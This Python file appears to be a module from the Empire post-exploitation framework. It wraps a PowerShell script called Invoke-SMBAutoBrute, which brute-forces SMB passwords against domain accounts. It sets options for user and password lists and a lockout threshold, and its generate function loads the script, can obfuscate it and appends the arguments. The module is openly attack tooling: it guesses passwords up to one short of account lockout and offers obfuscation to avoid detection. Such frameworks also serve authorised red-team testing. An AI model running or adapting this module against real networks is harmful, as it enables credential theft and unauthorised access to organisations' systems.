from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Invoke-SMBAutoBrute',

            # list of one or more authors for the module
            'Author': ['@curi0usJack'],

            # more verbose multi-line description of the module
            'Description': ('Runs an SMB brute against a list of usernames/passwords. '
                            'Will check the DCs to interrogate the bad password count of the '
			    'users and will keep bruting until either a valid credential is '
			    'discoverd or the bad password count reaches one below the threshold. '
			    'Run "shell net accounts" on a valid agent to determine the lockout '
		            'threshold. VERY noisy! Generates a ton of traffic on the DCs.' ),

            # True if the module needs to run in the background
            'Background' : True,

            # File extension to save the file as
            'OutputExtension' : None,

            # True if the module needs admin rights to run
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            # list of any references/other comments
            'Comments': [
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to run smbautobrute from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserList' : {
                'Description'   :   'File of users to brute (on the target), one per line. If not specified, autobrute will query a list of users with badpwdcount < LockoutThreshold - 1 for each password brute. Wrap path in double quotes.',
                'Required'      :   False,
                'Value'         :   ''
	    },
	    'PasswordList' : {
                'Description'   :   'Comma separated list of passwords to test. Wrap in double quotes.',
                'Required'      :   True,
                'Value'         :   ''
            },
	    'ShowVerbose' : {
                'Description'   :   'Show failed attempts & skipped accounts in addition to success.',
                'Required'      :   False,
                'Value'         :   ''
            },
	    'LockoutThreshold' : {
                'Description'   :   'The max number of bad password attempts until the account locks. Autobrute will try till one less than this setting.',
                'Required'      :   True,
                'Value'         :   ''
	    },
            'Delay' : {
                'Description'   :   'Amount of time to wait (in milliseconds) between attempts. Default 100.',
                'Required'      :   False,
                'Value'         :   ''
	    },
            'StopOnSuccess' : {
                'Description'   :   'Quit running after the first successful authentication.',
                'Required'      :   False,
                'Value'         :   ''
	   }
         }


        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        #   use the pattern below
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/situational_awareness/network/Invoke-SMBAutoBrute.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = "Invoke-SMBAutoBrute"

        # add any arguments to the end execution of the script
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
